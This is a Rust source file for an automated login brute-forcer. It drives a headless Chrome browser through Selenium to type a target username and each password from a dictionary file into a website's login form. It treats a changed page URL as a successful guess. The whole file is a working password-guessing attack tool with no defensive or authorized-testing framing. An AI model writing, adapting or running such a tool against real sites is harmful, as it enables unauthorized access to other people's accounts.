// local
use super::func::*;

//std
use std::path::Path;
use std::thread;
use std::time::Duration;
use std::process::exit;

// extern
use selenium_webdriver::*;

pub fn brute_force(website: String, username: String, password: String, button: String, user: String, dictionary: String, show_chrome: bool) {
    if website != "" && username != "" && password != "" && button != "" && user != "" && dictionary != "" {
        if Path::new(dictionary.trim()).exists() {
            let mut args = vec![];
            if show_chrome == true {
                args = vec!["--disable-popup-blocking", "--disable-extensions"];
            } else {
                args = vec!["--headless", "--disable-popup-blocking", "--disable-extensions"];
            }

            let mut driver = Browser::start_session(BrowserName::Chrome, args);
            let _ = driver.open(&*website).unwrap();
            if let Ok(lines) = read_lines(dictionary.trim()) {
                let mut attempt = 0;
                for line in lines {
                    if let Ok(pass) = line {
                        let input_username = driver.find_element(LocatorStrategy::CSS(string_to_static_str(username.clone()))).unwrap();
                        let _ = input_username.send_keys(&*user);
                        let input_password = driver.find_element(LocatorStrategy::CSS(string_to_static_str(password.clone()))).unwrap();
                        let _ = input_password.send_keys(&*pass);
                        let btn = driver.find_element(LocatorStrategy::CSS(string_to_static_str(button.clone()))).unwrap();
                        attempt += 1;
                        let _ = btn.click();
                        let _ = driver.open(&*website).unwrap();
                        let mut link: String = driver.get_link().unwrap();
                        let _ = driver.refresh();
                        let _ = thread::sleep(Duration::new(2, 0));
                        link = driver.get_link().unwrap();
                        if website != link {
                            println!("[!] [TRIED] => SUCCESS | [PASSWORD] => {}, [USERNAME] => {}, ATTEMPT => {}", String::from(pass), user, attempt);
                            let _ = driver.close_browser();
                            pause();
                            break;
                        } else {
                            println!("[!] [TRIED] => FALSE | [PASSWORD] => {}, [USERNAME] => {}, ATTEMPT => {}", String::from(pass), user, attempt);
                            continue;
                        }
                    }
                }
            }
        } else {
            println!("[!] The file ({:?}) You put does not exist :/", dictionary);
            pause();
        }
    } else {
        println!("[!] Please complete all fields ...");
        pause();
    }
    exit(0);
}

